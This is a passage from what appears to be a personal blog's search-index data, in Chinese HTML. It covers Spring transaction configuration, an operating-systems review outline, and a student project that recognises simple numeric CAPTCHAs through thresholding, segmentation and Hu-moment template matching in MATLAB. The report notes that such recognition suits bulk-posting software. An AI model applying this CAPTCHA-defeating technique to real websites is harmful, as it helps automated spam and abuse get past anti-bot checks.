class=\"name\">include</span>&gt;</span>**/*.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"5-声明式事务\"><a href=\"#5-声明式事务\" class=\"headerlink\" title=\"5.声明式事务\"></a>5.声明式事务</h2><h4 id=\"事务的ACID原则\"><a href=\"#事务的ACID原则\" class=\"headerlink\" title=\"事务的ACID原则\"></a>事务的ACID原则</h4><ul>\n<li>原子性</li>\n<li>一致性</li>\n<li>隔离性<ul>\n<li>多个事务操作同一个资源，防止数据损坏</li>\n</ul>\n</li>\n<li>持久性<ul>\n<li>​    事务一旦提交，无论系统发生什么问题，结果都被不会被影响，被持久化写到存储器中</li>\n</ul>\n</li>\n</ul>\n<p>首先创建事务管理器</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;tansactionmanager&quot;</span> \t\t\t                                 \t\t\t<span class=\"attr\">class</span>=<span class=\"string\">&quot;org.spring framework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">index</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后导入tx前缀</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"> http://www.springframework.org/schema/tx</span><br><span class=\"line\"> http://www.springframework.org/schema/tx/spring-tx.xsd</span><br></pre></td></tr></table></figure>\n\n<p>紧接着写tx:advice</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--创建事务管理    --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;transactionManager&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--AOP织入事务    --&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--配置事务通知    --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">tx:advice</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;txAdvice&quot;</span> <span class=\"attr\">transaction-manager</span>=<span class=\"string\">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--给哪些方法配置事务        --&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--配置事务的传播特性        --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tx:attributes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tx:method</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">propagation</span>=<span class=\"string\">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tx:method</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;delete&quot;</span> <span class=\"attr\">read-only</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tx:method</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;update&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tx:method</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;*&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tx:attributes</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211217184041079.png\" alt=\"image-20211217184041079\"  />\n\n<p>默认是REQUIRED</p>\n","categories":["java"]},{"title":"数字验证码识别","url":"/p/65017/","content":"<h1 id=\"一、课题概述\"><a href=\"#一、课题概述\" class=\"headerlink\" title=\"一、课题概述\"></a>一、课题概述</h1><p>随着互联网技术的发展和应用，网络在给人们提供丰富资源和极大便利的同时，伴随而来的是互联网系统的安全性问题。数字验证码的出现是web系统安全性的产物。研究数字验证码的识别显得非常有必要。</p>\n<p>验证码识别技术可以用于网站的群发软件，数字验证码识别是光学字符识别(OCR)的一种，是进行模式识别研究的基础。论文提出了以简单变形的数字字符为理论研究素材，将模板匹配作为基本框架的验证码识别系统。</p>\n<p>本次作业所做的就是一种基础的人工智能–模式识别。本文需要研究的是模式识别中的图像识别，主要是模拟人类的视觉特性，其目标是识别验证码，即读取图像文件中的数字字符。所谓验证码就是由程序随机生成的一组字符(数字或数字与字母的组合)图片。在有些情况下, 为了实现一系列自动操作需要对验证码进行识别。基于这种原因, 本文选择了验证码作为识别的对象。验证码的识别涉及到了图像预处理、分割、特征提取、识别等相关技术。描述了验证码图像的预处理工作，包括彩色验证码图像的灰度化、二值化、去噪和归一化等调整等预处理。</p>\n<p>介绍了验证码图像中字符的分割算法，图像分割是指把图像分解成各具特性的区域并提取出感兴趣目标的技术和过程，分割结果的好坏将直接影响到视觉系统的性能。本文主要介绍了图像分割的基本知识，并对两种验证码图像分别设计不同的分割方法。对第一种字符间距较大但是字符笔画有断裂的验证码采取了改进的投影分割法进行分割；对第二种字符倾斜且粘连的验证码采取了结合连通域法、投影法和寻找最短路径的方法进行分割。采用MATLAB仿真了所有分割过程，得到了比较理想的分割结果。</p>\n<p>最后提出了一种本设计基于hu不变矩，进行数字验证码的识别，建立一个模板库，自由读取数字验证码进行识别并且输出0-9这10个数字组成的四位验证码。试验结果表明，加权的模板匹配法保证了数字识别的正确率，而对数字进行预分类和细化处理，可以大大缩小模板匹配的识别速度，弥补了模板匹配算法对于大量数字耗时多的缺点，提升了系统速度。</p>\n<p>本文的算法通过提取数字字符特征量， 对待识别的数字字符进行带有冗余的分类， 力求在保证分组成功的基础上尽可能缩小字符匹配范围，同时进行数字字符细化，以提高系统的运算速度， 对细化后的字符骨架进行特征提取， 并进行加权模板匹配，保证了系统的识别正确率，实验结果表明，两者的结合使系统有较高的识别正确率与识别速度，达到了预期的效果。</p>\n<p>。</p>\n<h1 id=\"二、解决思路\"><a href=\"#二、解决思路\" class=\"headerlink\" title=\"二、解决思路\"></a>二、解决思路</h1><p>所用到的技术：</p>\n<p><strong>1****、开闭运算</strong></p>\n<p>图像开运算与闭运算与膨胀和腐蚀运算有关，由膨胀和腐蚀两个运算的复合与集合操作（并、交、补等）组合成的运算构成。开运算与闭运算依据腐蚀和膨胀演变而来。</p>\n<p>1）开运算：先对图像腐蚀后膨胀。</p>\n<p>A○S= （AΘS）⊕ S</p>\n<p>作用：用来消除小的物体，平滑形状边界，并且不改变其面积。可以去除小颗粒噪声，断开物体之间的粘连。</p>\n<p>2）闭运算：先对图像膨胀后腐蚀</p>\n<p>A●S= （A⊕S）Θ S</p>\n<p>作用：用来填充物体内的小空洞，连接邻近的物体，连接断开的轮廓线，平滑其边界的同时不改变面积。</p>\n<p>2、rgb转灰度图</p>\n<p>RGB彩色图像中，一种彩色由R（红色），G（绿色），B（蓝色）三原色按比例混合而成。</p>\n<p>图像的基本单元是一个像素，就像一个巨幅电子广告屏上远处看是衣服图像，走近你会看到一个一个的方格，这个方格的颜色是一种，从远处看，觉察不到这个方格的存在。</p>\n<p>一个像素需要3块表示，分别代表R，G，B，如果8为表示一个颜色，就由0-255区分不同亮度的某种原色。</p>\n<p>一张9像素的8位RGB图像，在计算机内存中的分布大概示意如下：</p>\n<p>实际中数都是二进制形式的，并且未必按照R，G，B顺序，比如opencv是按照B,G,R顺序将三个色值保存在3个连续的字节里</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/clip_image007.jpg\" alt=\"img\"></p>\n<p>灰度图像是用不同饱和度的黑色来表示每个图像点，比如用8位 0-255数字表示“灰色”程度，每个像素点只需要一个灰度值，8位即可，这样一个3X3的灰度图，只需要9个byte就能保存</p>\n<p>RGB值和灰度的转换，实际上是人眼对于彩色的感觉到亮度感觉的转换，这是一个心理学问题，有一个公式：</p>\n<p>Grey = 0.299<em>R + 0.587</em>G + 0.114*B</p>\n<p>根据这个公式，依次读取每个像素点的R，G，B值，进行计算灰度值（转换为整型数），将灰度值赋值给新图像的相应位置，所有像素点遍历一遍后完成转换。</p>\n<p>3、基于阈值的图像分割</p>\n<p>有直方图双峰法、固定阈值分割法、迭代法阈值图像分割、自适应阈值图像分割(本文基于此)</p>\n<p>Ostu假设图像是由前景区域和背景区域两部分组成的，通过遍历计算不同阈值（通常为[0 255]区间范围内）下分割结果中前景区域和背景区域的灰度直方图，然后比较两者之间的方差，使得方差最大化的那个灰度阈值即为所求二值化阈值。  </p>\n<p>  对于一幅图像，设当前景与背景的分割阈值为t时，前景点占图像比例为w0，均值为u0，背景点占图像比例为w1，均值为u1。则整个图像的均值为u = w0<em>u0+w1</em>u1。建立目标函数g(t)=w0*(u0-u)^2+w1*(u1-u)^2，g(t)就是当分割阈值为t时的类间方差表达式。OTSU算法使得g(t)取得全局最大值，当g(t)为最大时所对应的t称为最佳阈值。OTSU算法又称为最大类间方差法</p>\n<p>一幅有depth个灰度级，根据每个灰度级t，可以将一幅图分为前景和背景。</p>\n<p>前景指所有灰度级低于等于t的像素点，背景指大于t的像素点。</p>\n<p>w0指前景像素个数；w1指背景像素个数；u0指前景加权平均，即</p>\n<p>temp=0;</p>\n<p>for i=1:t</p>\n<p>  temp=temp+i*hist(i)</p>\n<p>end</p>\n<p>u0=temp/w0;</p>\n<p>其中w0=hist(0)+hist(1)+……+hist(t)</p>\n<p>hist指各个灰度级上的像素个数</p>\n<p>u1对应是背景加权平均</p>\n<p>u对应整幅图的加权平均</p>\n<p>u=u0<em>w0+u1</em>w1.(*)</p>\n<p>大津法的结果指使得g最大的t值：</p>\n<p>g=w0*(u0-u)^2+w1*(u1-u)^2=w0<em>w1</em>(u1-u0)^2 （代入*式可得）</p>\n<p>4、Hu不变矩</p>\n<p>几何矩是由Hu(Visual pattern recognition by moment invariants)在1962年提出的，图像f(x，y)的(p+q)阶几何矩定义为 </p>\n<p>  Mpq =∫∫(x^p)*(y^q)f(x，y)dxdy(p，q = 0，1，……∞）</p>\n<p> 矩在统计学中被用来反映随机变量的分布情况，推广到力学中，它被用作刻画空间物体的质量分布。同样的道理，如果我们将图像的灰度值看作是一个二维或三维的密度分布函数，那么矩方法即可用于图像分析领域并用作图像特征的提取。最常用的，物体的零阶矩表示了图像的“质量”：</p>\n<p>​       Moo= ∫∫f(x，y )dxdy </p>\n<p>​       一阶矩(M01，M10)用于确定图像质心( Xc，Yc)：</p>\n<p>​     Xc = M10/M00;Yc = M01/M00;</p>\n<p>若将坐标原点移至 Xc和 Yc处，就得到了对于图像位移不变的中心矩。如</p>\n<p>​    Upq =∫∫[(x-Xc)^p]*[(y-Yc)^q]f(x，y)dxdy。</p>\n<p> Hu在文中提出了7个几何矩的不变量，这些不变量满足于图像平移、伸缩和旋转不变。如果定义</p>\n<p>​    Zpq=Upq/(U20 + U02)^(p+q+2)，</p>\n<p>​     Hu 的7种矩为：</p>\n<p>​     H1=Z20+Z02;H1=(Z20+Z02)^2+4Z11^2;……</p>\n<p>矩是描述图像特征的算子，它在模式识别与图像分析领域中有重要的应用．迄今为止，常见的矩描述子可以分为以下几种：几何矩、正交矩、复数矩和旋转矩．其中几何矩提出的时间最早且形式简单，对它的研究最为充分。几何矩对简单图像有一定的描述能力，他虽然在区分度上不如其他三种矩，但与其他几种算子比较起来，他极其的简单，一般只需用一个数字就可表达。所以，一般我们是用来做大粒度的区分，用来过滤显然不相关的文档。</p>\n<p>比如在图形库中，可能有100万幅图，也许只有200幅图是我们想要的。使用一维的几何矩的话，就可以对几何矩进行排序，建立索引，然后选出与目标图的几何矩最近的2000幅图作比较就好了。而对于其他的矩来说，由于一般是多维的关系，一般不好排序，只能顺序查找，自然速度有巨大的差别.所以。虽然几何矩不太能选出最像的，但可以快速排除不像的，提高搜索效率。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/clip_image008.png\" alt=\"img\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/clip_image008.png\" alt=\"img\"></p>\n<p>工作原理</p>\n<p>1.建立字模库，首先在网上寻找大量的纯数字的验证码以供后期识别使用。取出其中的30%作为子模块，70%做测试正确率使用。</p>\n<p>2.对识别目标进行预处理</p>\n<p>2.1 RGB转灰度图。通过上面所使用的的公式转换</p>\n<p>2.2平滑目标图，去除噪声点。</p>\n<p>为取出图片的噪点通过一个3*3的矩阵遍历整张图片如果周围少于4个1则判断为噪点将其赋值为0，也就是变为背景色。</p>\n<p>2.2灰度图转二值图（OSTU自适应阈值法分割前景与背景）</p>\n<p>通过寻找最小方差得出一个自适应阈值，将大于该阈值的值赋值为1，小于该值则赋为0.获得灰度图转换后的二值图，将前景与背景分离出来。</p>\n<p>2.3对目标的进行开操作去除噪点</p>\n<p>开运算 = 先腐蚀运算，再膨胀运算（看上去把细微连在一起的两块目标分开了）<br> 开运算的效果图如下图所示</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/clip_image010.jpg\" alt=\"img\"></p>\n<p>3.目标图片的分割，将一张图片分成不同的独立个体</p>\n<p>1、 泛水填充法</p>\n<p>泛水填充法在前面降噪的地方就提到过，主要思路还是连通域的思想。对于相互之间没有粘连的字符验证码，直接对图片进行扫描，遇到一个黑的pixel就对其进行泛水填充，所有与其连通的字符都被标记出来，因此一个独立的字符就能够找到了。这个方法优点是效率高，时间复杂度是O（N），N为像素的个数；而且不用考虑图片的大小、相邻字符间隔以及字符在图片中得位置等其他任何因素，任何验证码图片只要字符相互是独立的，不需要对其他任何阀值做预处理，直接就操作；用这种方法分割正确率非常高，几乎不会出现分割错误的情况。但是缺点也很致命：那就是字符之间必须完全隔离，没有粘连的部分，否则会将两个字符误认为一个字符。</p>\n<p>2.水滴法</p>\n<p>从上到下遍历每一行的和，如果和小于某个数则继续向下直到遍历到第一个大于该值的行，设其为初始行。再继续遍历直到某个值小于该值设其为终止行</p>\n<p>从左到右同理，直到分割出四张独立的图片。</p>\n<p>4.对分割好的图片进行标准化使得长宽符合标准并保存</p>\n<p>5.通过比对样本库进行图像识别</p>\n<p>5.1 对子模库中的图片标准化后建立特征串，生成目标图片的特征串。</p>\n<p>从左到右从上到下将1和0对字模库的图片串联起来形成子模串（20*20的字符串）然后将切割后的图片经过标准化后与子模库中的对比。通过两种距离进行比对与字模库中特征串进行比对，采用汉明距离或者欧式距离。选择差异最小的距离作为识别结果。</p>\n<p>5.2通过不变矩Hu矩进行识别，根据提取出的Hu矩特征向量与字模库中的特征向量逐个比对相减。最后获得值最小的向量求出识别结果。最后将四个识别出的结果进行返回。</p>\n<p>核心代码</p>\n<p>% 3种比对方法</p>\n<p>real = []</p>\n<p>for i=1:10:40</p>\n<p>  real = [real mod(find(result==min(result(i:i+9)))-1,10)];</p>\n<p>end</p>\n<p>real = []</p>\n<p>for i=1:10:40</p>\n<p>  real = [real min(result(i:i+9))];</p>\n<p>end</p>\n<p>-————————————————-</p>\n<p>% 汉明距离</p>\n<p>xxs = [];</p>\n<p>figure,imshow(p4),title(‘p4’);</p>\n<p>for i=1:10</p>\n<p>  p4= imresize(p3(8:32,seg(1,1):seg(1,2)),[12,9]);</p>\n<p>  chap4 = reshape(p4.’,1,108);</p>\n<p>  result = [chap4;reshape(s(:,:,i).’,1,108)];</p>\n<p>  xxs = [xxs pdist(result,’hamming’)];</p>\n<p>end</p>\n<p>% Hu矩—————————————————</p>\n<p>ojs = [];</p>\n<p>for i=1:4</p>\n<p>  p4= imresize(p3(8:32,seg(i,1):seg(i,2)),1);</p>\n<p>%   figure,imshow(p4),title(i);</p>\n<p>  ojs = [ojs;HuCount(p4)];</p>\n<p>end</p>\n<p>answ = []</p>\n<p>temps = []</p>\n<p>answs = [];</p>\n<p>for i=1:4</p>\n<p>  for o=0:9</p>\n<p>​    tt = imread(strcat(‘./db/‘,num2str(o),’.jpg’));</p>\n<p>​    hu6 = HuCount(tt);</p>\n<p>​    temps = [temps norm(hu6-ojs(i:i,1:7))];</p>\n<p>  end</p>\n<p>  answ = [answ temps]</p>\n<p>  answs = [answs min(temps)];</p>\n<p>  temps = [];</p>\n<p>end</p>\n<p>% 比对过程</p>\n<p>for i = 1 : length(fileList)</p>\n<p>  filenamei = fileList{i};</p>\n<p>  [pathstr, name, ext] = fileparts(filenamei);</p>\n<p>  if isequal(ext, ‘.jpg’)</p>\n<p>​    ti = imread(filenamei);</p>\n<p>​    ti = imbinarize(ti, 0.5);</p>\n<p>​    ti = double(ti);</p>\n<p>​    % 提取不变矩特征数据</p>\n<p>​    phii = invmoments(ti);</p>\n<p>​    % 开始比对</p>\n<p>​    OTj = [];</p>\n<p>​    for j = 1 : 4</p>\n<p>​      tij = double(Ti{j});</p>\n<p>​      phij = invmoments(tij);</p>\n<p>​      ad = norm(phii-phij);</p>\n<p>​      otij.filename = filenamei;</p>\n<p>​      otij.ad = ad;</p>\n<p>​      OTj = [OTj otij];</p>\n<p>​    end</p>\n<p>​    Tj = [Tj; OTj];</p>\n<p>​    val = cat(1,Tj.ad);</p>\n<p>  end</p>\n<p>end</p>\n<p>vs1 = []</p>\n<p>for i=1:10</p>\n<p>  comim = imread(strcat(‘./db/‘,int2str(i-1),’.jpg’));</p>\n<p>  comim = imbinarize(comim, 0.5);</p>\n<p>  comim = double(comim);</p>\n<p>%   figure,subplot(121),imshow(comim),title(‘1’),axis on;</p>\n<p>%   subplot(122),imshow(Ti{3}),title(‘2’),axis on;</p>\n<p>  v1 = invmoments(comim);</p>\n<p>  v2 = invmoments(Ti{2});</p>\n<p>  vs1 = [vs1;norm(v1-v2)];</p>\n<p>end</p>\n<p>实验结果</p>\n<p>展示例子</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/clip_image012.jpg\" alt=\"img\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/clip_image014.jpg\" alt=\"img\"></p>\n<p>result变量存储着结果，可以看到准确率达到了85%。</p>\n<h1 id=\"三、小组分工\"><a href=\"#三、小组分工\" class=\"headerlink\" title=\"三、小组分工\"></a>三、小组分工</h1><p>所有工作本人亲力亲为</p>\n<h1 id=\"四、实验感悟\"><a href=\"#四、实验感悟\" class=\"headerlink\" title=\"四、实验感悟\"></a>四、实验感悟</h1><p>由于数字图像处理的方便性和灵活性,因此数字图像处理技术已经成为了图像处理领域中的主流。数字图像处理技术主要涉及到的关键技术有：图像的采集与数字化、图像的编码、图像的增强、图像恢复、图像分割、图像分析等。图像的采集与数字化：就是通过量化和取样将一个自然图像转换为计算机能够处理的数字形式。</p>\n<p>图像编码：图像编码的目的主要是来压缩图像的信息量，以便能够满足存储和传输的要求。</p>\n<p>图像的增强：图像的增强其主要目的是使图像变得清晰或者将其变换为机器能够很容易分析的形式,图像增强方法一般有：直方图处理、灰度等级、伪彩色处理、边缘锐化、干扰抵制。</p>\n<p>图像的恢复：图像恢复的目的是减少或除去在获得图像的过程中因为各种原因而产生的退化，可能是由于光学系统的离焦或像差、被摄物与摄像系统两者之间的相对运动、光学或电子系统的噪声与介于被摄像物跟摄像系统之间的大气湍流等等。</p>\n<p>图像的分割：图像分割是将图像划分为一些互相不重叠的区域，其中每一个区域都是像素的一个连续集，通常采用区域法或者寻求区域边界的境界法。</p>\n<p>图像分析：图像分析是指从图像中抽取某些有用的信息、数据或度量,其目的主</p>\n<p>要是想得到某种数值结果。图像分析的内容跟人工智能、模式识别的研究领域有</p>\n<p>一定的交叉。</p>\n<p>在这次实验中我学到并巩固了之前所学的知识。比如图像的锐化，中值滤波，均值滤波，图像的开闭运算，腐蚀与膨胀。各种分割算法。对图像进行识别的方法有很多种，要根据不同图像的特征采用不同的处理，不同的特征选取。不同的方法对结果的正确率影响很大</p>\n","categories":["图像处理"],"tags":["hexo"]},{"title":"操作系统复习提纲","url":"/p/65031/","content":"<h2 id=\"操作系统复习提纲\"><a href=\"#操作系统复习提纲\" class=\"headerlink\" title=\"操作系统复习提纲\"></a>操作系统复习提纲</h2><h3 id=\"第一章-概述\"><a href=\"#第一章-概述\" class=\"headerlink\" title=\"第一章 概述\"></a>第一章 概述</h3><h4 id=\"操作系统的定义\"><a href=\"#操作系统的定义\" class=\"headerlink\" title=\"操作系统的定义\"></a>操作系统的定义</h4><p>管理计算机硬件与软件资源的计算机程序</p>\n<h4 id=\"提供用户的使用方式\"><a href=\"#提供用户的使用方式\" class=\"headerlink\" title=\"提供用户的使用方式\"></a>提供用户的使用方式</h4><p>操作系统作为用户与计算机硬件系统之间的接口，用户可通过三种方式使用计算机：命令方式、系统调用方式、图标-窗口方式</p>\n<p>1.命令方式：典型的命令行方式有DOS系统和Unix系统等</p>\n<p>2.系统调用方式：（system call)为了达到这个目的，内核提供一系列具备预定功能的多内核函数，通过一组称为系统调用的接口呈现给用户。系统调用把应用程序的请求传给内核，调用相应的的内核函数完成所需的处理，将处理结果返回给应用程序</p>\n<p>3.图标-窗口方式：操作系统所提供的图形化界面</p>\n<h4 id=\"操作系统的分类、各种类别的特点；\"><a href=\"#操作系统的分类、各种类别的特点；\" class=\"headerlink\" title=\"操作系统的分类、各种类别的特点；\"></a>操作系统的分类、各种类别的特点；</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226211416455.png\" alt=\"image-20211226211416455\"></p>\n<h4 id=\"特权指令、处理器的状态及程序状态字\"><a href=\"#特权指令、处理器的状态及程序状态字\" class=\"headerlink\" title=\"特权指令、处理器的状态及程序状态字\"></a>特权指令、处理器的状态及程序状态字</h4><p>  所谓特权指令是指有特权权限的指令，由于这类指令的权限最大，如果使用不当，将导致整个系统崩溃。比如：清内存、置时钟、分配系统资源、修改虚存的段表和页表，修改用户的访问权限等。如果所有的程序都能使用这些 指令，那么你的系统一天死机n回就不足为奇了。为了保证系统安全，这类指令只能用于操作系统或其他系统软件，不直接提供给用户使用。因此，特权执行必须在核心态执行。实际上，cpu在核心态下可以执行指令系统的全集。形象地说，特权指令就是 那些儿童不宜的东西，而非特权指令则是老少皆宜。</p>\n<p>为了防止用户程序中使用特权指令，用户态下只能使用非特权指令，核心态下可以使用全部指令。当在用户态下使用特权指令时，将产生中断以阻止用户使用特权指令。所以把用户程序放在用户态下运行，而操作系统中必须使用 特权指令的那部分程序在核心态下运行，保证了计算机系统的安全可靠。从用户态转换为核心态的唯一途径是中断或异常。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226211644867.png\" alt=\"image-20211226211644867\"></p>\n<p>程序状态字（PSW）是计算机系统的核心部件，属于控制器的一部分。PSW用来存储两类信息：<br> 1.当前指令执行结果的各种状态信息，如有无进位，有无溢出，结果正负，结果是否为零，奇偶标志位等。</p>\n<p>2.存放控制信息，如允许中断、当前态、以前态、能否执行特权指令。有些机器中将PSW成为标志寄存器。</p>\n<p><a src=\"https://blog.csdn.net/weixin_43461520/article/details/108545283\">操作系统结构</a></p>\n<h4 id=\"现代操作系统特点\"><a href=\"#现代操作系统特点\" class=\"headerlink\" title=\"现代操作系统特点\"></a>现代操作系统特点</h4><h3 id=\"第二章-进程与线程\"><a href=\"#第二章-进程与线程\" class=\"headerlink\" title=\"第二章 进程与线程\"></a>第二章 进程与线程</h3><h4 id=\"多道程序并发执行的特点\"><a href=\"#多道程序并发执行的特点\" class=\"headerlink\" title=\"多道程序并发执行的特点\"></a>多道程序并发执行的特点</h4><p>间断性 ，失去封闭性，不可再现性，资源共享性，并发程序的相互制约性</p>\n<h4 id=\"进程的定义及其与程序的区别、\"><a href=\"#进程的定义及其与程序的区别、\" class=\"headerlink\" title=\"进程的定义及其与程序的区别、\"></a>进程的定义及其与程序的区别、</h4><p>进程是允许某个并发执行的程序在某个数据集合上的运行过程。</p>\n<p>进程是由正文段、用户数据段及进程控制块共同组成的执行环境。正文段存放被执行的机器指令，用户数据段存放进程在执行时直接进行操作的用户数据。进程控制块存放程序的运行环境，操作系统通过这些数据描述和管理进程。</p>\n<p>程序是静态的，进程是动态的，程序是存储在某种介质上的二进制代码，进程对应了程序的执行过程，系统不需要为一个不执行的程序创建进程，一旦进程被创建，就处于不断变化的动态过程中，对应了一个不断变化的上下文环境。</p>\n<p>程序是永久的，进程是暂时存在的。程序的永久性是相对于进程而言的，只要不去删除它，它可以永久的存储在介质当中。</p>\n<h4 id=\"进程的组成以及特点\"><a href=\"#进程的组成以及特点\" class=\"headerlink\" title=\"进程的组成以及特点\"></a>进程的组成以及特点</h4><p>进程实体的组成：程序段、数据段、程序控制块（PCB）</p>\n<p>  <strong>动态性</strong>：进程的最基本的特征，进程是程序的一次执行过程，是动态的产生、变化和消亡。<br>  <strong>并发性</strong>：内存中有多个进程实体，各进程可并发执行。<br>  <strong>独立性</strong>：进程是能独立运行、独立获得资源、独立接受调度的基本单位。<br>  <strong>异步性</strong>：各个进程按各自独立的、不可预知的速度向前推进，操作系统要提供进程同步机制来解决异步问题。<br>  <strong>结构性</strong>：每个进程都会配置一个PCB。结构上看，进程由程序段、数据段和PCB组成。</p>\n<h4 id=\"进程的三态及转换\"><a href=\"#进程的三态及转换\" class=\"headerlink\" title=\"进程的三态及转换\"></a>进程的三态及转换</h4><p>进程的基本状态：<br>①就绪（Ready）状态<br>当进程已分配到除CPU以外的所有必要资源后，只要再获得CPU，便可立即执行，进程这时的状态就称为就绪状态。在一个系统中处于就绪状态的进程可能有多个，通常将他们排成一个队列，称为就绪队列。<br>②执行状态<br>进程已获得CPU，其程序正在执行。在单处理机系统中，只有一个进程处于执行状态；在多处理机系统中，则有多个进程处于执行状态。<br>③阻塞状态<br>正在执行的进程，由于等待某个事件发生而无法执行时，便放弃处理机而处于阻塞状态。引起进程阻塞的事件可有多种，例如，等待I/O完成、申请缓冲区不能满足、等待信件(信号)等。</p>\n<p>当然理论上上述三种状态之间转换分为六种情况；<br>    运行—》就绪：这是有调度引起的，主要是进程占用CPU的时间过长<br>    就绪—》运行：运行的进程的时间片用完，调度就转到就绪队列中选择合适的进程分配CPU<br>   运行—》阻塞：发生了I/O请求或等待某件事的发生<br>   阻塞—》就绪:进程所等待的事件发生，就进入就绪队列<br>   以上4种情况可以相互正常转换，不是还有两种情况吗？<br>     阻塞–》运行：即使给阻塞进程分配CPU，也无法执行，操作系统載进行调度时不会載阻塞队列进行挑选，其调度的选择对象为就绪队列：<br>    就绪–》阻塞：因为就绪态根本就没有执行，何来进入阻塞态？</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211226213218767.png\" alt=\"image-20211226213218767\"></p>\n<h4 id=\"进程控制原语\"><a href=\"#进程控制原语\" class=\"headerlink\" 